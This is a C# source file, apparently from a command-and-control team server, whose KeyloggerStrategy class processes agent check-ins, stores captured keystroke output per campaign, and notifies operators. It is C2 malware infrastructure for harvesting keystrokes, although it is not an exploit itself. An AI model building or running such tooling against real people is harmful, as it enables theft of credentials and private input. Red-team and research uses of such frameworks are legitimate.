using System.Text.Json;
using Trinity.Shared.Interfaces;
using TeamServer.Repositories;
using Trinity.Shared.DTOs.Notification;
using Trinity.Shared.DTOs.Task;
using Trinity.Shared.Enums.Tasks;
using Trinity.Shared.Interfaces;
using Trinity.Shared.Models;
using Trinity.Shared.Enums;

namespace TeamServer.Handlers.CheckinHandler.Strategies
{
    public class KeyloggerStrategy : ICheckinStrategy
    {
        private readonly TaskRepository _taskRepo;
        private readonly IKeyloggerService _keyloggerService;
        private readonly AgentRepository _agentRepo;
        private readonly INotificationDispatcher _hub;

        public KeyloggerStrategy(TaskRepository taskRepository, IKeyloggerService keyloggerService, AgentRepository agentRepository, INotificationDispatcher notificationHub)
        {
            _taskRepo = taskRepository;
            _keyloggerService = keyloggerService;
            _agentRepo = agentRepository;
            _hub = notificationHub;
        }
        public async System.Threading.Tasks.Task ProcessResponseAsync(JsonElement element)
        {
            if (!element.TryGetProperty("TaskID", out var taskIDElement) ||
                taskIDElement.ValueKind != JsonValueKind.Number ||
                !taskIDElement.TryGetInt32(out var taskID))
            {
                throw new InvalidOperationException("Keylogger response is missing a valid TaskID.");
            }
            var task = await _taskRepo.GetByIdAsync(taskID) ?? throw new ArgumentNullException("Task does not exist!");
            var agent = await _agentRepo.GetAgentByIDAsync(task.AgentID) ?? throw new ArgumentNullException("Agent does not exist!");

            var campaignID = agent.CampaignID;

            var response = JsonSerializer.Deserialize<TaskResp<TaskSuccessResponse>>(element);

            if (response == null)
            {
                throw new InvalidOperationException("Keylogger response could not be deserialized.");
            }

            if (string.IsNullOrWhiteSpace(response.Data.Output))
            {
                throw new InvalidOperationException("Keylogger response contains no output data.");
            }

            task.Status = Status.SUCCESS;
            task.Result = new TaskResult
            {
                TaskID = task.ID,
                Result = response.Data.Output
            };

            await _taskRepo.CommitAsync();

            await _keyloggerService.SaveDataAsync(campaignID, task.Result.Result);
            
            await _hub.SendTaskResponseAsync(task.AgentID.ToString(), new TaskNotification(DateTime.UtcNow, taskID, "Keylogger task completed successfully.", Status.SUCCESS));
        }
    }
}